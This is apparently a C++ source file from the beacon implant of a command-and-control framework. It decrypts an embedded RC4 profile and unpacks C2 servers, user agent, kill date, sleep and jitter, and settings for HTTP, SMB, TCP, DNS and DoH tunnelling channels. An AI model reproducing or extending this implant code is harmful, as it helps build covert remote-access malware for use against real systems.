#include "AgentConfig.h"
#include "Packer.h"
#include "Crypt.h"
#include "utils.h"
#include "config.h"

AgentConfig::AgentConfig()
{
	ULONG length       = 0;
	ULONG size         = getProfileSize();
	CHAR* ProfileBytes = (CHAR*) MemAllocLocal(size);
	memcpy(ProfileBytes, getProfile(), size);

	Packer* packer = (Packer*)MemAllocLocal(sizeof(Packer));
	*packer = Packer( (BYTE*)ProfileBytes, size);
	ULONG profileSize = packer->Unpack32();

	this->encrypt_key = (PBYTE) MemAllocLocal(16);
	memcpy(this->encrypt_key, packer->data() + 4 + profileSize, 16);

	DecryptRC4(packer->data()+4, profileSize, this->encrypt_key, 16);
	
	this->agent_type = packer->Unpack32();
	
#if defined(BEACON_HTTP)
	this->profile.use_ssl       = packer->Unpack8();
	this->profile.servers_count = packer->Unpack32();
	this->profile.servers       = (BYTE**) MemAllocLocal(this->profile.servers_count * sizeof(LPVOID) );
	this->profile.ports         = (WORD*)  MemAllocLocal(this->profile.servers_count * sizeof(WORD) );
	for (int i = 0; i < this->profile.servers_count; i++) {
		this->profile.servers[i] = packer->UnpackBytesCopy(&length);
		this->profile.ports[i]   = (WORD) packer->Unpack32();
	}
	this->profile.http_method  = packer->UnpackBytesCopy(&length);
	this->profile.uri          = packer->UnpackBytesCopy(&length);
	this->profile.parameter    = packer->UnpackBytesCopy(&length);
	this->profile.user_agent   = packer->UnpackBytesCopy(&length);
	this->profile.http_headers = packer->UnpackBytesCopy(&length);
	this->profile.ans_pre_size = packer->Unpack32();
	this->profile.ans_size     = packer->Unpack32() + this->profile.ans_pre_size;

	this->listener_type = 0;

	this->kill_date    = packer->Unpack32();
	this->working_time = packer->Unpack32();
	this->sleep_delay  = packer->Unpack32();
	this->jitter_delay = packer->Unpack32();

#elif defined(BEACON_SMB)

	this->profile.pipename = packer->UnpackBytesCopy(&length);
	this->listener_type    = packer->Unpack32();
	this->kill_date        = packer->Unpack32();
	this->working_time     = 0;
	this->sleep_delay      = 0;
	this->jitter_delay     = 0;

#elif defined(BEACON_TCP)
	this->profile.prepend = packer->UnpackBytesCopy(&length);
	this->profile.port    = packer->Unpack32();
	this->listener_type   = packer->Unpack32();
	this->kill_date       = packer->Unpack32();
	this->working_time    = 0;
	this->sleep_delay     = 0;
	this->jitter_delay    = 0;

#elif defined(BEACON_DNS)
	// DNS beacon profile layout is packed on the Go side in pl_agent.go
	// case "dns" as:
	// [agent_type, domain, resolvers, qtype, pkt_size, label_size, ttl,
	//  listener_type, kill_date, working_time, sleep_seconds, jitter]
	// Here we unpack in the same order and populate ProfileDNS + timing
	// fields so that DNS beacon uses the same sleep/jitter behavior as
	// the HTTP beacon.
	this->profile.domain      = packer->UnpackBytesCopy(&length);
	this->profile.resolvers   = packer->UnpackBytesCopy(&length);
	this->profile.qtype       = packer->UnpackBytesCopy(&length);
	this->profile.pkt_size    = packer->Unpack32();
	this->profile.label_size  = packer->Unpack32();
	this->profile.ttl         = packer->Unpack32();
	// reuse global encrypt_key as DNS transport key
	this->profile.encrypt_key = this->encrypt_key;
	this->listener_type       = packer->Unpack32();
	this->kill_date           = packer->Unpack32();
	this->working_time        = packer->Unpack32();
	this->sleep_delay         = packer->Unpack32();
	this->jitter_delay        = packer->Unpack32();

#elif defined(BEACON_DOH)
	this->profile.domain      = packer->UnpackBytesCopy(&length);
	this->profile.urls        = packer->UnpackBytesCopy(&length);
	this->profile.user_agent  = packer->UnpackBytesCopy(&length);
	this->profile.pkt_size    = packer->Unpack32();
	this->profile.label_size  = packer->Unpack32();
	this->profile.ttl         = packer->Unpack32();
	this->profile.encrypt_key = this->encrypt_key;
	this->listener_type       = packer->Unpack32();
	this->kill_date           = packer->Unpack32();
	this->working_time        = packer->Unpack32();
	this->sleep_delay         = packer->Unpack32();
	this->jitter_delay        = packer->Unpack32();

#elif defined(BEACON_DNS_DOH)
	// Combined DNS+DoH profile layout (ProfileDNSDoH) is packed on the Go side
	// pl_agent.go case "doh" as:
	// [agent_type,
	//  dns.domain, dns.resolvers, dns.qtype, dns.pkt_size, dns.label_size, dns.ttl,
	//  doh.domain, doh.urls, doh.user_agent, doh.pkt_size, doh.label_size, doh.ttl,
	//  mode,
	//  listener_type, kill_date, working_time, sleep_seconds, jitter]
	// Here we unpack in the same order and wire both transports to the shared
	// global encrypt_key.
	this->profile.dns.domain      = packer->UnpackBytesCopy(&length);
	this->profile.dns.resolvers   = packer->UnpackBytesCopy(&length);
	this->profile.dns.qtype       = packer->UnpackBytesCopy(&length);
	this->profile.dns.pkt_size    = packer->Unpack32();
	this->profile.dns.label_size  = packer->Unpack32();
	this->profile.dns.ttl         = packer->Unpack32();
	this->profile.dns.encrypt_key = this->encrypt_key;

	this->profile.doh.domain      = packer->UnpackBytesCopy(&length);
	this->profile.doh.urls        = packer->UnpackBytesCopy(&length);
	this->profile.doh.user_agent  = packer->UnpackBytesCopy(&length);
	this->profile.doh.pkt_size    = packer->Unpack32();
	this->profile.doh.label_size  = packer->Unpack32();
	this->profile.doh.ttl         = packer->Unpack32();
	this->profile.doh.encrypt_key = this->encrypt_key;
	this->profile.doh.doh_mode    = packer->UnpackBytesCopy(&length);

	this->profile.mode            = packer->UnpackBytesCopy(&length);
	this->profile.doh_mode        = packer->UnpackBytesCopy(&length);

	this->listener_type           = packer->Unpack32();
	this->kill_date               = packer->Unpack32();
	this->working_time            = packer->Unpack32();
	this->sleep_delay             = packer->Unpack32();
	this->jitter_delay            = packer->Unpack32();

#endif

#if defined(BEACON_DNS) || defined(BEACON_DOH) || defined(BEACON_DNS_DOH)
	// DNS beacon uses a smaller per-chunk download size to improve
	// reliability over the constrained DNS transport channel.
	this->download_chunk_size = 0x8000; // 32 KB
#else
	this->download_chunk_size = 0x19000; // ~100 KB for HTTP/other transports
#endif

	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));
	MemFreeLocal((LPVOID*)&ProfileBytes, size);

}